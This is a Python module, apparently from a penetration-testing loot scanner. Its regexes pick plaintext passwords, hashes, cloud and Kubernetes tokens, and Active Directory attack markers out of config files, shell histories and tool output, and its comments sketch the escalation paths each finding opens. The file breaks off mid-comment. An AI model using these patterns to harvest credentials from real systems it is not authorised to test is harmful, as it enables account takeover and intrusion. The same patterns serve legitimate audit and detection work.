"""keyword.py - secret_name = real_value, plus high-value cred/AD content shapes.

Passes per line:
  1. analyzers.credline - the single classifier for cred-bearing lines
     (netexec output, pwdump rows, ConvertTo-SecureString, plain user:pass).
     This replaces the old crude DOMAIN\\user:pass regex that flooded the
     report with icacls masks, pwdump rows and tool help-strings.
  2. a few inline-cred shapes credline doesn't own (autologon, runas, SQL
     IDENTIFIED BY, mysql -p, sshpass).
  3. generic `keyword = value` (filtered hard via analyzers.filters).
"""
import os
import re
from analyzers import filters, credline

KEY = re.compile(
    r'\b(pass(?:word|wd|phrase)?|pwd|secret|api[_-]?key|access[_-]?key|secret[_-]?key|'
    r'token|auth[_-]?token|bearer|bindpw|db_pass(?:word)?|smtp_pass|ftp_pass|sa_password|'
    r'ldap_account_service_password|private[_-]?key[_-]?password|client[_-]?secret|'
    r'master[_-]?key|encryption[_-]?key|secret[_-]?key[_-]?base|jwt[_-]?secret|'
    r'connection[_-]?string|conn[_-]?str|_authtoken|requirepass|masterauth)\b'
    r'\s*[:=]\s*(.+)', re.IGNORECASE)
SKIP_LINE = re.compile(r'^\s*(#|//|\*|/\*|--\s|;)')

# code filetypes: require the value to be QUOTED (detect-secrets lesson).
_CODE_EXT = {".js", ".ts", ".py", ".rb", ".php", ".pl", ".ps1", ".java", ".go",
             ".c", ".cpp", ".cs", ".sh", ".tf", ".groovy"}

# inline-cred shapes that credline.classify does NOT already cover.
_AD = [
    # AutoLogon: matches BOTH .reg export ("DefaultPassword"="x") AND winPEAS /
    # `reg query` columnar output (DefaultPassword  REG_SZ  x).
    ("autologon password", re.compile(
        r'(?i)(?:"?DefaultPassword"?|AutoAdminLogon\s+password)\s*(?:["=:]+|\s+REG_SZ\s+)\s*["\']?([^"\'\r\n]{3,})')),
    ("SQL IDENTIFIED BY", re.compile(r'(?i)IDENTIFIED\s+BY\s+["\']([^"\']{3,})["\']')),
    ("mysql -p inline", re.compile(r'(?i)\bmysql\b[^\n]*?\s-p(\S{3,})')),
    ("sshpass -p", re.compile(r'(?i)sshpass\s+-p\s*["\']?([^"\'\s]{3,})')),
    ("runas /savecred", re.compile(r'(?i)runas\s+(?:/\w+\s+)*/user:(\S+)')),
    # iter-86: RDP saved session artifacts. The '.rdp' format stores lines
    # like 'username:s:HTB\\administrator' and 'full address:s:10.10.10.5'
    # in plaintext (the pw is DPAPI-encrypted 'password 51:b:...' - operator
    # needs the user's DPAPI masterkey to decrypt, which R-DPAPI already
    # chains when both are present). Surface the user + host so the
    # operator knows WHO was RDP'd to WHERE.
    ("RDP saved user", re.compile(r'^username:s:([^\r\n]{2,80})$')),
    ("RDP target host", re.compile(r'^full address:s:([^\r\n]{2,80})$')),
    # iter-87: RDCMan .rdg XML variant. Same DPAPI-encrypted password but
    # user/domain/server name are plaintext XML text nodes. One line at a
    # time is fine because RDCMan emits each field on its own line.
    ("RDCMan user", re.compile(r'<userName>([^<>\r\n]{2,80})</userName>')),
    ("RDCMan domain", re.compile(r'<domain>([^<>\r\n]{2,80})</domain>')),
    ("RDCMan server", re.compile(r'<name>([^<>\r\n]{2,80}\.[^<>\r\n]+)</name>')),
    ("ldapsearch -w bind", re.compile(r'(?i)\bldapsearch\b[^\n]*?\s-w\s*["\']([^"\']{3,})["\']')),
    ("smbclient -U pass", re.compile(r'(?i)\bsmbclient\b[^\n]*?\s-U\s+\S+%([^\s"\']{3,})')),
    ("psexec inline", re.compile(r'(?i)\bpsexec(?:\.py)?\b[^\n]*?\s\S+/\S+:([^\s@"\']{3,})@')),
    # MSSQL setup-INI keys: SAPWD, SQLSVCPASSWORD, AGTSVCPASSWORD, RSSVCPASSWORD,
    # ISSVCPASSWORD, FTSVCPASSWORD (EscapeTwo, real exam-style ConfigurationFile.ini).
    # These slip past the generic KEY regex because `\bpassword` won't match
    # mid-word in `SQLSVCPASSWORD`.
    ("MSSQL setup key", re.compile(
        r'(?i)\b(?:SA|AGTSVC|SQLSVC|RSSVC|ISSVC|FTSVC|ASSVC)(?:PWD|PASSWORD)\s*=\s*["\']?([^"\'\s\r\n]{3,})["\']?')),
    # PHP define('CONST_*', 'value')  -  WordPress wp-config.php (DB_PASSWORD,
    # AUTH_KEY, NONCE_SALT, etc.) plus any CONST whose name ends in PASSWORD /
    # SECRET / KEY / TOKEN. `\bpass(word)?` won't catch DB_PASSWORD because
    # the boundary fails between `B` and `P`.
    ("PHP define secret", re.compile(
        r"(?i)\bdefine\s*\(\s*['\"]([A-Z][A-Z0-9_]*(?:PASSWORD|PASS|PWD|SECRET|KEY|SALT|TOKEN))['\"]"
        r"\s*,\s*['\"]([^'\"\r\n]{3,})['\"]")),
    # Plain $varEndingInPwdLike = "X":  Joomla $password / $smtppass, MediaWiki
    # $wgDBpassword / $wgSecretKey, Drupal $databases array values, any $\w*
    # ending in password/pass/pwd/secret/salt/authtoken. We deliberately omit
    # $key/$token (too generic - matches encryption-key config vars).
    ("PHP var secret", re.compile(
        r"(?i)\$\w*(?:password|passwd|pwd|secret|salt|authtoken|smtppass|ftppass|dbpass)\b"
        r"\s*=\s*['\"]([^'\"\r\n]{3,})['\"]")),
    # PHP nested-array string key: 'password' => 'X', 'db_passwd' => 'X', "PWD" => "X"
    # (Koken database.php, OpenAdmin $ona_contexts, generic Phinx/Slim configs)
    ("PHP array secret", re.compile(
        r"(?i)['\"](?:db_)?(?:password|passwd|pwd|secret|salt|smtppass)['\"]"
        r"\s*=>\s*['\"]([^'\"\r\n]{3,})['\"]")),
    # MongoDB BSON shell output: { ..., "username" : "X", "password" : "Y" }
    ("MongoDB BSON", re.compile(
        r'"username"\s*:\s*"([^"]{1,40})"[^}]{0,200}?"password"\s*:\s*"([^"]{3,80})"')),
    # Legacy Windows LAPS cleartext attribute: ms-Mcs-AdmPwd: <pw>
    # (post-decryption read; Streamio / Outdated / Rebound modern fixture)
    ("LAPS ms-Mcs-AdmPwd", re.compile(
        r'(?i)\bms-mcs-admpwd\s*:\s*(?!\s)([^\r\n]{3,80})')),
    # Windows LAPS v2 cleartext-after-decrypt output: 'Password : <pw>' under
    # 'ComputerName' / 'Account' block produced by Get-LapsADPassword -AsPlainText
    ("LAPS v2 cleartext", re.compile(
        r'(?im)^\s*Password\s*:\s*([^\r\n]{6,80})$')),
    # gMSA managed password LDIF attribute (base64 blob; flag, don't try to decode).
    # The classic LDIF `::` prefix indicates base64; gMSADumper does the NTLM parse.
    ("gMSA ManagedPassword", re.compile(
        r'(?i)\bmsDS-ManagedPassword\b\s*::\s*([A-Za-z0-9+/=]{40,})')),
    # Shadow credentials marker - msDS-KeyCredentialLink writes are non-destructive
    # but high-signal (precondition for PKINIT NT-hash recovery via Certipy).
    ("Shadow credentials", re.compile(
        r'(?i)msDS-KeyCredentialLink\b|Adding Key Credential with device ID')),
    # Certipy `Got hash for 'user@DOM': LM:NT` shadow-creds / PKINIT output.
    # We DON'T put this in `_AD` to keep the unconditional CRED-pair routing
    # below clean; instead it's split out so we can emit user-bound NT.
    ("Certipy got-hash", re.compile(
        r"(?i)\b(?:Got|NT)\s+hash\s+for\s+['\"]?([^\s'\":@]{1,40})(?:@[^\s'\"]+)?['\"]?\s*:\s*"
        r"(?:([a-f0-9]{32}):)?([a-f0-9]{32})\b")),
    # tomcat-users.xml <user username="X" password="Y" roles="Z"/>  - capture both
    # user and pw, plus roles so the hint distinguishes RCE-path (manager-script /
    # admin-gui) from read-only.
    ("tomcat-users", re.compile(
        r'(?i)<user\s+(?=[^>]*\busername\s*=\s*["\']([^"\']{1,40})["\'])'
        r'(?=[^>]*\bpassword\s*=\s*["\']([^"\']{1,80})["\'])'
        r'(?:[^>]*\broles\s*=\s*["\']([^"\']{0,200})["\'])?[^>]*/?>')),
    # FileZilla / similar: <Pass encoding="base64">b64</Pass>
    ("FileZilla pass", re.compile(
        r'(?i)<Pass\s+encoding\s*=\s*["\']base64["\']\s*>([A-Za-z0-9+/=]{4,200})</Pass>')),
    # Windows unattend.xml: <Value>X</Value> inside a Password/AdministratorPassword
    # where <PlainText>true</PlainText> appears on the same line OR within ~80
    # chars. (Plaintext branch only - the base64-UTF16LE branch needs proper XML
    # context tracking and lives in a separate analyzer.)
    ("unattend plaintext", re.compile(
        r'(?i)<Password>\s*<Value>([^<\r\n]{3,})</Value>\s*<PlainText>\s*true\s*</PlainText>')),
    # Jenkins encrypted blob in credentials.xml - cannot decrypt without master.key
    # + hudson.util.Secret (the full chain), but flag the file as a high-value
    # target and point to the offline decoder.
    ("Jenkins enc blob", re.compile(
        r'\{AQAAA[A-Za-z0-9+/=]{20,}\}')),
    # ---- iter-6 INTEL markers (not raw creds; high-signal next-step pointers) ----
    # AD CS ESC vuln from certipy/certify output. Broad match here; the dispatch
    # branch requires an ADCS context word on the line to avoid 'ESC1' FPs.
    ("ADCS ESC", re.compile(r'\bESC(1[0-6]|[1-9])\b')),
    # RBCD: the attribute name is unique enough to flag unconditionally.
    ("RBCD marker", re.compile(r'(?i)\bmsDS-AllowedToActOnBehalfOfOtherIdentity\b')),
    # BloodHound ACL edge, arrow form: name --[WriteOwner]--> target (distinctive).
    # A real edge always points at a destination principal; require a node token
    # after the arrow so prose that merely names the notation (e.g. a markdown doc:
    # "reading `--[GenericAll]-->` style edges") doesn't FP.
    ("BloodHound ACL edge", re.compile(
        r'--\[(WriteDacl|WriteOwner|GenericAll|GenericWrite|ForceChangePassword|'
        r'AddMember|Owns|AllExtendedRights|AddKeyCredentialLink|ReadGMSAPassword|'
        r'ReadLAPSPassword|AddSelf|WriteSPN)\]-->\s*["\']?[A-Za-z0-9][\w$.@-]+')),
    # WSUS abuse tool invocation.
    ("WSUS abuse", re.compile(r'(?i)\bSharpWSUS(?:\.exe)?\s+(?:create|approve|check|delete)\b')),
    # DPAPI masterkey recovery output / mimikatz dpapi module.
    ("DPAPI masterkey", re.compile(
        r'(?i)dpapi::masterkey|\[masterkey\]\s*[a-f0-9]{32,}|guidMasterKey')),
    # ADO.NET connection string: connectionString="...;User ID=x;Password=y;"
    # (Mantis Orchard web.config). Captures the whole value; branch parses it.
    ("ADO connectionString", re.compile(
        r'(?i)connectionString\s*=\s*["\']([^"\'\r\n]{8,400})["\']')),
    # ---- iter-7 round-2 completeness adds (from workflow's missing-class list) ----
    # SQL INSERT cred row: INSERT INTO users (..., username, ..., password, ...)
    # VALUES (..., 'X', ..., '$2y$10$...', ...); also pg/MySQL COPY/dump format.
    # Captures bcrypt/MD5/plain into PASSWORD HASHES.
    ("SQL INSERT cred row", re.compile(
        r"(?i)INSERT\s+INTO\s+\W?(?:users?|members?|accounts?|admins?|"
        r"login|customers?|employees?)[^()]*\([^)]*\bpassword\b[^)]*\)\s*VALUES\s*\(([^)]+)\)")),
    # SNMP community strings: rocommunity/rwcommunity + value (+ optional ACL).
    # Direct enum vector - rwcommunity = direct foothold on the OSCP exam.
    ("SNMP community", re.compile(
        r'(?i)^\s*(rocommunity|rwcommunity|rocommunity6|rwcommunity6)\s+'
        r'([^\s#]{3,60})(?:\s+([^\s#]+))?')),
    # docker-compose / k8s / .env environment variables that look credential-y.
    # MYSQL_ROOT_PASSWORD, POSTGRES_PASSWORD, REDIS_PASSWORD etc.
    ("docker env secret", re.compile(
        r'(?i)\b(MYSQL_(?:ROOT_)?PASSWORD|POSTGRES_(?:DB_)?PASSWORD|MARIADB_(?:ROOT_)?PASSWORD|'
        r'MONGO(?:DB)?_(?:INITDB_)?(?:ROOT_)?PASSWORD|REDIS_PASSWORD|RABBITMQ_(?:DEFAULT_)?PASS|'
        r'ELASTIC_PASSWORD|MINIO_(?:ROOT_)?(?:USER|PASSWORD)|GF_SECURITY_ADMIN_PASSWORD|'
        r'KEYCLOAK_ADMIN_PASSWORD|HASURA_GRAPHQL_ADMIN_SECRET|'
        r'SMTP_(?:PASSWORD|PASS|AUTH_PASSWORD))\s*[:=]\s*["\']?([^"\'\r\n]{3,80})["\']?')),
    # PowerShell PSReadLine history: cmdkey /add:host /user:DOM\u /pass:X
    # (one of the highest-value OSCP+ history-file lines).
    # `\w` doesn't include '\' so we use `[^\s/]+` for the inter-flag tokens.
    ("cmdkey history", re.compile(
        r'(?i)\bcmdkey(?:\.exe)?\s+(?:/[^\s/]+\s+)*/pass(?:word)?\s*[:=]\s*([^\s/]{3,80})')),
    # ASP.NET machineKey - both halves are crackable hex for ViewState forgery.
    ("ASP.NET machineKey", re.compile(
        r'(?i)<machineKey\b[^>]*?\bvalidationKey\s*=\s*["\']([A-F0-9]{16,})["\'][^>]*?'
        r'\bdecryptionKey\s*=\s*["\']([A-F0-9]{16,})["\']')),
    # SCCM Network Access Account (NAA) is two-line - handled by
    # _multiline_passes() below, not the line-by-line _AD loop.
    # LSA-secrets section in secretsdump (machine account + LSA SCM service creds)
    ("LSA secret", re.compile(
        r'(?i)\$MACHINE\.ACC\s*:\s*([a-f0-9]{32}:[a-f0-9]{32})|'
        r'^SCM\s*:\s*\{[^}]*\}\s*:\s*(\S+):(\S+)', re.MULTILINE)),
    # ---- iter-8 round-1 completeness adds ----
    # Certipy 'find -vulnerable' template block markers (per-ESC verbose dump).
    # The block carries 'Template Name : <name>' + 'Vulnerabilities : ESC<n>'
    # + 'Enrollment Rights : <principal list>' - we capture the template name +
    # ESC number for a precise per-template finding.
    ("Certipy template ESC", re.compile(
        r'(?i)Template\s+Name\s*:\s*(\S[^\r\n]{0,60})[\s\S]{0,800}?'
        r'Vulnerabilit(?:y|ies)\s*:\s*([^\r\n]{1,120})')),
    # PostgreSQL pg_hba.conf 'trust' / 'md5' / 'scram-sha-256' / 'password' lines:
    # `local all all trust` means anyone can become any DB user from localhost
    # without a password. 'host all all 0.0.0.0/0 trust' = unauth remote DB.
    ("pg_hba auth method", re.compile(
        r'^\s*(local|host|hostssl|hostnossl|hostgssenc|hostnogssenc)\s+'
        r'(\S+)\s+(\S+)\s+(?:(\S+)\s+)?(trust|password|reject)\b', re.MULTILINE)),
    # MySQL/MariaDB option file [client] / [mysql] / [mysqldump] sections with
    # plaintext password=... (.my.cnf, /etc/mysql/debian.cnf).
    ("mysql client opt", re.compile(
        r'(?im)^\s*password\s*=\s*["\']?([^"\'#\r\n]{3,80})["\']?\s*$')),
    # iter-26: .bash_history / .zsh_history / .fish_history typed creds.
    # Common shapes (per HTB/THM walkthroughs):
    #   mysql -u root -pP@ss123
    #   mysql -u root --password=P@ss123
    #   curl -u admin:P@ss123 http://...
    #   curl -H "Authorization: Basic <b64>" ...   (handled by encoded.py)
    #   sshpass -p 'P@ss123' ssh user@host
    #   ftp -u user:pass ftp://...
    #   psql 'host=db user=postgres password=P@ss'
    # Capture each common form once per line. Per-rule dispatch parses out
    # the user/pw and emits CRED PAIRS.
    ("bash history mysql -p", re.compile(
        r'(?i)\b(?:mysql|mariadb|mysqldump)\s+[^\r\n]*?(?:-u|--user[= ])\s*'
        r'["\']?(\S{1,40})["\']?[^\r\n]*?(?:-p|--password[= ])\s*'
        r'["\']?([^"\'\s][^"\'\s\r\n]{1,79})["\']?')),
    ("bash history sshpass -p", re.compile(
        r'(?i)\bsshpass\s+-p\s+["\']?([^"\'\s][^"\'\s\r\n]{2,79})["\']?\s+'
        r'(?:ssh|scp|rsync)\s+[^\r\n]*?(\S+@\S+)')),
    # iter-31 FP fix: the user portion must not look like a URL scheme
    # (http/https/ftp/etc.) - otherwise `curl -u http://<IP>:8080/api`
    # matched with user='http' pw='//<IP>...' which is a URL, not a cred.
    # Also reject when the user starts with '<' (placeholder) or contains '/'.
    ("bash history curl -u", re.compile(
        r'(?i)\bcurl\s+[^\r\n]*?(?:-u|--user)\s+'
        r'["\']?(?!(?:https?|ftp|smb|s3|file|ldap|ssh)://)'
        r'([A-Za-z_][A-Za-z0-9._-]{0,39}):'
        r'([^"\'\s/<][^"\'\s\r\n]{1,79})["\']?')),
    ("bash history wget --user", re.compile(
        r'(?i)\bwget\s+[^\r\n]*?--user[= ]\s*["\']?(\S{1,40})["\']?\s+'
        r'[^\r\n]*?--password[= ]\s*["\']?([^"\'\s][^"\'\s\r\n]{1,79})["\']?')),
    # iter-26: /etc/passwd GECOS field with embedded plaintext password.
    # Shape: user:x:UID:GID:GECOS:home:shell  - the GECOS can carry an
    # admin's reminder like 'svc-web - default pwd: WinterIsCold2024!'.
    # Only fire when the GECOS contains a 'pass/pwd/cred/default' marker,
    # and reuse filters.extract_pw_from_desc() to find the actual token.
    ("etc passwd GECOS hint", re.compile(
        r'(?m)^([a-z_][a-z0-9_-]{0,31}):[x*!\$][^:]*:\d+:\d+:'
        r'([^:\r\n]*(?:pass|pwd|cred|default)[^:\r\n]*):'
        r'/[^:\r\n]*:/[^:\r\n]*$')),
    # Redis requirepass / masterauth in conf - already partially handled by KEY,
    # but here as a dedicated rule with a service-bound hint.
    ("redis requirepass", re.compile(
        r'(?im)^\s*(requirepass|masterauth)\s+([^\s#]{3,80})')),
    # /etc/sudoers NOPASSWD entry: gives `user` direct root via the named cmd
    # without a password - a single-line privesc primitive.
    ("sudoers NOPASSWD", re.compile(
        r'(?i)^(\S+)\s+\S+\s*=\s*\([^)]*\)\s*NOPASSWD\s*:\s*(\S[^\r\n]{0,200})', re.MULTILINE)),
    # Writable cron entry pointing at a script. iter-8 round-2: the old regex
    # backtracked catastrophically on lines like '----   ----   ---' from
    # smbmap/table output (the broad `[\s/*0-9,-]+` repeated greedily). Now we
    # require EXACTLY 5 cron-time fields - each strictly `*`, `*/N`, `N`,
    # `N,N`, `N-N`, or `N/N` - before the optional user + script path.
    ("cron script ref", re.compile(
        r'^\s*(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
        r'(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
        r'(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
        r'(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
        r'(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
        r'(?:[\w-]+\s+)?'
        r'((?:/[\w./-]+)(?:\.sh|\.py|\.pl|\.rb|\.bash))\b', re.MULTILINE)),
    # Hashcat potfile line (hash:plain). Only fired when the path looks like a
    # potfile (extension/filename gate is in the dispatch branch) AND the hash
    # half starts with a recognised hash prefix ($1$, $2y$, $5$, $6$, $apr1$,
    # $krb5..., $keepass$, $pwsafe$, $sntp-ms$, $DCC2$, $S$, $P$/$H$, $argon2,
    # etc.) or is exactly 32/40 hex - the bare-shape match alone was matching
    # every `attribute: value` LDIF line.
    ("hashcat potfile", re.compile(
        r'^(\$(?:1|2[aby]|5|6|y|argon2[id]+|apr1|S|P|H|NT|DCC2|krb5(?:tgs|asrep|pa)|'
        r'keepass|pwsafe|sntp-ms|ansible|pkcs12|ANSIBLE_VAULT)\$\S{6,}|'
        r'[a-fA-F0-9]{32}|[a-fA-F0-9]{40}|[a-fA-F0-9]{60}):([^\r\n:]{3,100})$',
        re.MULTILINE)),
    # John's john --show output and pot lines: hash:plain too. Pot lines start
    # with $NT$, $krb5tgs$, etc. The plain half must NOT be hex-only or contain
    # a hash-prefix '$' (which would indicate the line is still inside the hash).
    ("john pot", re.compile(
        r'^(\$NT\$[a-fA-F0-9]{32}|\$krb5(?:tgs|asrep|pa)\$\S{20,}):([^\r\n\$:]{3,80})$',
        re.MULTILINE)),
    # AWS credentials INI shape: `[profile]\naws_access_key_id = AKIA...\n
    # aws_secret_access_key = ...`. The secret already matches our 'AWS secret'
    # rule; here we flag the SESSION TOKEN line too.
    ("AWS session token", re.compile(
        r'(?i)\baws_session_token\s*=\s*([A-Za-z0-9/+=]{100,})')),
    # GCP service-account JSON keys: 'private_key' field as PEM blob marker.
    ("GCP service account", re.compile(
        r'"type"\s*:\s*"service_account"[\s\S]{0,200}?"private_key_id"\s*:\s*"([a-f0-9]{40})"')),
    # Kubeconfig bearer token: `token: <jwt>` under user.token, or
    # `client-certificate-data: <b64>` + `client-key-data: <b64>` under user.
    ("kubeconfig token", re.compile(
        r'(?im)^\s*token\s*:\s*([A-Za-z0-9._-]{32,})\s*$')),
    # iter-27: ~/.docker/config.json auth b64. Shape:
    #   "auths": {"registry.io": {"auth": "dXNlcjpwYXNz"}}
    # The b64 decodes to user:password for direct registry auth. Also
    # covers Kubernetes .dockerconfigjson secrets which use the same shape.
    ("docker config auth", re.compile(
        r'"auth"\s*:\s*"([A-Za-z0-9+/]{8,}={0,2})"')),
    # iter-27: Ansible inventory / group_vars password variables. Common
    # in Ansible-provisioned lab boxes (THM Overpass 2 Hacked, HTB Curling,
    # etc). Also covers ansible_ssh_pass (older name) and
    # ansible_winrm_password / ansible_become_password.
    ("ansible var pass", re.compile(
        r'(?im)^\s*(ansible_(?:become_(?:pass(?:word)?)?|ssh_pass|password|'
        r'winrm_pass(?:word)?|paramiko_pass))\s*[:=]\s*'
        r'["\']?([^\s"\'#\r\n]{3,80})["\']?\s*$')),
    # iter-27: GitLab runner config.toml token entry. The [[runners]]
    # section carries `token = "..."` which auths the runner to GitLab.
    ("gitlab runner token", re.compile(
        r'(?im)^\s*token\s*=\s*"([A-Za-z0-9_-]{20,})"\s*$')),
    # iter-27: Chef data_bags encrypted secret (marker). Just flag as
    # INTERESTING; decryption requires the org's shared secret key.
    ("chef databag marker", re.compile(
        r'"encrypted_data"\s*:\s*"[A-Za-z0-9+/]{50,}={0,2}"')),
    # iter-28: systemd .service unit Environment= directive with a plaintext
    # password / token / secret. Common on service-managed lab boxes where
    # a maintainer inlines DB creds instead of using EnvironmentFile=.
    # Shape:
    #   Environment=DB_PASSWORD=SuperSecret!2024
    #   Environment="POSTGRES_PASSWORD=P@ss word"
    # Also matches ExecStart lines with inline env prefix.
    ("systemd Environment=", re.compile(
        r'(?im)^\s*Environment\s*=\s*"?'
        r'([A-Z][A-Z0-9_]{2,40}(?:PASS(?:WORD)?|PWD|SECRET|TOKEN|KEY|CRED))'
        r'=([^"\r\n]{3,200})"?\s*$')),
    # iter-28: RabbitMQ definitions.json users array - handled in
    # _multiline_passes() since the fields span JSON lines.
    # iter-29: APT machine auth (/etc/apt/auth.conf.d/*.conf). Same
    # ~/.netrc format but scoped to APT: 'machine host login user password X'.
    # Common on THM/OSCP+ boxes with private APT repos.
    ("apt auth machine", re.compile(
        r'(?im)^\s*machine\s+(\S+)\s+login\s+(\S+)\s+password\s+(\S+)\s*$')),
    # iter-29: HAProxy userlist entry: 'user admin insecure-password P@ss' or
    # 'user admin password $6$...'. Only fire on the insecure-password form
    # (the hashed form is caught by patterns.py bcrypt/sha512crypt rules).
    ("haproxy user insecure", re.compile(
        r'(?im)^\s*user\s+(\S{1,50})\s+insecure-password\s+(\S{3,80})')),
    # iter-29: rsyncd.conf 'secrets file' pointer - flag the referenced path.
    ("rsyncd secrets pointer", re.compile(
        r'(?im)^\s*secrets\s+file\s*=\s*(\S{3,200})\s*$')),
    # iter-29: Postfix smtp_sasl_password_maps: pointer to a hash file that
    # holds 'smtp.example.com user:password' rows.
    ("postfix sasl map", re.compile(
        r'(?im)^\s*smtp_sasl_password_maps\s*=\s*hash:\s*(\S{3,200})\s*$')),
    # iter-29: haproxy stats socket admin password: 'stats admin if TRUE ...'
    # or 'stats auth admin:P@ss' style
    ("haproxy stats auth", re.compile(
        r'(?im)^\s*stats\s+auth\s+(\S{1,50}):(\S{3,80})\s*$')),
    # iter-32: Java Spring application.properties datasource passwords.
    # Also covers Micronaut / Quarkus (same dot-property shape).
    ("spring datasource props", re.compile(
        r'(?im)^\s*(?:spring\.datasource(?:\.\w+)?|datasources\.\w+|'
        r'quarkus\.datasource(?:\.\w+)?|micronaut\.datasources\.\w+)'
        r'\.(?:password|pwd)\s*=\s*(\S{3,200})\s*$')),
    # iter-32: Python framework SECRET_KEY (Django settings.py, Flask
    # config.py). Also covers FastAPI, Starlette. 16-char minimum to avoid
    # placeholder trigger 'CHANGE_ME'-style short values.
    ("python SECRET_KEY", re.compile(
        r'(?im)^\s*(SECRET_KEY|JWT_SECRET_KEY|SECURITY_PASSWORD_SALT|'
        r'CSRF_SECRET|SESSION_SECRET|FLASK_SECRET)'
        r'\s*=\s*["\']([^"\'\r\n]{16,200})["\']')),
    # iter-32: uppercase-PASSWORD dict entry - Django DATABASES {"PASSWORD":
    # "X"} shape but also fires on any JSON/YAML with that key. Kept because
    # a MongoDB dump / JSON export with a real password in there is loot too;
    # dispatcher relabels based on file context.
    ("uppercase PASSWORD dict entry", re.compile(
        r"(?i)['\"]PASSWORD['\"]\s*:\s*['\"]([^'\"\r\n]{3,200})['\"]")),
    # iter-33: PowerShell $env:VARNAME = 'X' where VARNAME ends in a
    # password / secret / token marker. Common in Windows service-setup
    # scripts on HTB/THM lab boxes that provision creds via PowerShell.
    # Also matches $ENV:varname (case insensitive in PowerShell).
    ("powershell env var secret", re.compile(
        r"(?i)\$env:([A-Z][A-Z0-9_]{2,50}(?:PASSWORD|PASS|PW|PWD|SECRET|"
        r"TOKEN|KEY|CRED))\s*=\s*['\"]([^'\"\r\n]{3,200})['\"]")),
    # iter-33: PowerShell Set-Item env:VAR VALUE alternate form
    ("powershell set-item env", re.compile(
        r"(?i)Set-Item\s+env:([A-Z][A-Z0-9_]{2,50}(?:PASSWORD|PASS|PW|PWD|"
        r"SECRET|TOKEN|KEY|CRED))\s+['\"]([^'\"\r\n]{3,200})['\"]")),
    # iter-43: [Environment]::SetEnvironmentVariable('X', 'Y'[, 'User']) -
    # .NET-style env setter, common in enterprise service-setup scripts.
    ("dotnet env setter", re.compile(
        r"(?i)\[Environment\]::SetEnvironmentVariable\s*\(\s*"
        r"['\"]([A-Z][A-Z0-9_]{2,50}(?:PASSWORD|PASS|PW|PWD|"
        r"SECRET|TOKEN|KEY|CRED))['\"]\s*,\s*"
        r"['\"]([^'\"\r\n]{3,200})['\"]")),
    # iter-57: Kubernetes ServiceAccount JWT. K8s SA tokens have the
    # '/serviceaccount' string in the payload's iss + claim keys, whose
    # base64url encoding always contains 'L3NlcnZpY2VhY2NvdW50' regardless
    # of byte alignment (verified empirically). Distinct from generic
    # JWTs because K8s SAs grant API access to cluster secrets on the
    # pod's behalf.
    ("k8s serviceaccount token", re.compile(
        r'(eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]*'
        r'L3NlcnZpY2VhY2NvdW50'
        r'[A-Za-z0-9_-]*\.[A-Za-z0-9_-]{20,})')),
    # iter-28: PostgreSQL .pgpass row where credline may have already
    # caught it, but a keyword pass emits it into ASSIGNED SECRETS too
    # so the operator sees the host + db context inline.
    ("pgpass row hint", re.compile(
        r'(?m)^([^:\r\n]+):(\d{1,5}|\*):([^:\r\n]+):([^:\r\n]+):'
        r'([^:\r\n#][^:\r\n]{2,80})\s*$')),
    # Terraform state with "sensitive": true output keeps the plaintext value.
    ("Terraform sensitive", re.compile(
        r'"sensitive"\s*:\s*true[\s\S]{0,300}?"value"\s*:\s*"([^"]{3,200})"')),
    # Azure CLI accessTokens.json shape - look for the bearer access token.
    ("Azure access token", re.compile(
        r'"accessToken"\s*:\s*"(eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_.-]+\.[A-Za-z0-9_-]+)"')),
    # Supervisord inet_http_server creds (rare, but a real OSCP-flavored box):
    # `[inet_http_server]\nport=...\nusername=admin\npassword=...`
    ("supervisord inet creds", re.compile(
        r'(?is)\[inet_http_server\][\s\S]{0,500}?username\s*=\s*(\S+)[\s\S]{0,200}?password\s*=\s*(\S+)')),
    # asterisk manager.conf - VoIP boxes (Beep-like)
    ("asterisk manager", re.compile(
        r'(?is)^\s*\[([\w_-]+)\]\s*[\r\n]+(?:[^\r\n]*[\r\n]+)*?secret\s*=\s*([^\s#\r\n]{3,80})', re.MULTILINE)),
    # Veeam VBR plaintext-fielded creds in stored sessions / backup .vbm xml
    ("Veeam creds", re.compile(
        r'(?is)<Cred[^>]*\sUsername\s*=\s*"([^"]{1,80})"[^>]*\sPassword\s*=\s*"([^"]{3,200})"')),
    # GitHub Actions secret REFERENCE - the secret itself is in vault, but the
    # presence of `${{ secrets.X }}` in a checked-out workflow tells the operator
    # which CI secret name to target.
    ("GH Actions secret ref", re.compile(
        r'\$\{\{\s*secrets\.(\w+)\s*\}\}')),
    # Confluence/Atlassian seraph + LDAP password fields in atlassian-user.xml
    ("atlassian secret", re.compile(
        r'(?i)<password>([^<\r\n]{3,80})</password>')),
    # PowerShell SecureString export blob (Export-Clixml of a PSCredential):
    # `<SS N="Password">01000000d08c9ddf01...</SS>`
    ("PSCredential SS blob", re.compile(
        r'<SS\s+N\s*=\s*"Password"\s*>([0-9a-f]{40,})</SS>')),
    # OpenVPN auth-user-pass file (two lines: user, pass)
    ("ovpn auth-user-pass", re.compile(
        r'(?im)^\s*auth-user-pass\s+(\S+)\s*$')),
    # WireGuard PrivateKey in [Interface]
    ("WireGuard PrivateKey", re.compile(
        r'(?im)^\s*PrivateKey\s*=\s*([A-Za-z0-9+/]{42,44}=)\s*$')),
    # NetSCREEN / Cisco IOS enable secret 5/7
    ("Cisco enable secret", re.compile(
        r'(?i)\benable\s+secret\s+(\d)\s+([\S]{6,200})')),
    # JuicyPotato / Print Spooler / SeImpersonate output that lists a token to
    # impersonate. Intel-only.
    ("token impersonation", re.compile(
        r'(?i)SeImpersonatePrivilege|SeAssignPrimaryToken|JuicyPotato\.exe|PrintSpoofer\.exe|GodPotato\.exe|RoguePotato\.exe')),
    # iter-163: SeBackupPrivilege - Backup Operators / hive-save primitive.
    # Direct DA path when captured on a DC (reg save HKLM\SAM / SYSTEM /
    # SECURITY on a domain-joined host = local hashes; on the DC itself =
    # NTDS.dit backup which yields DCSync via impacket-secretsdump LOCAL).
    # Wildly under-detected in OSCP+ walkthroughs where the operator gets
